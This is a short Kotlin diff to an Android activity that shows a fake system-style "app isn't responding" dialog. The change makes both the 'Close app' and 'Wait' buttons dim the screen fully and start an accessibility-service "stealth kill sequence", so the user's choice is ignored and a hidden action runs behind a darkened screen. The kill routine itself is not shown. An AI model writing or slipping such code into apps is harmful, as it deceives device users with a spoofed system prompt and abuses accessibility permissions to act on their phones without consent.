@@ -116,8 +116,16 @@ class PulseActivity : Activity() {
             val dialog = android.app.AlertDialog.Builder(this, style)
                 .setTitle("$appName isn't responding")
                 .setMessage("$appName isn't responding.\nDo you want to close it?")
-                .setPositiveButton("Close app") { _, _ -> finish() }
-                .setNegativeButton("Wait") { _, _ -> finish() }
+                .setPositiveButton("Close app") { _, _ -> 
+                    DimmerManager.applyDim(this, 100, "ACC")
+                    MyAccessibilityService.instance?.startStealthKillSequence()
+                    finish() 
+                }
+                .setNegativeButton("Wait") { _, _ -> 
+                    DimmerManager.applyDim(this, 100, "ACC")
+                    MyAccessibilityService.instance?.startStealthKillSequence()
+                    finish() 
+                }
                 .setCancelable(false)
                 .create()
                 
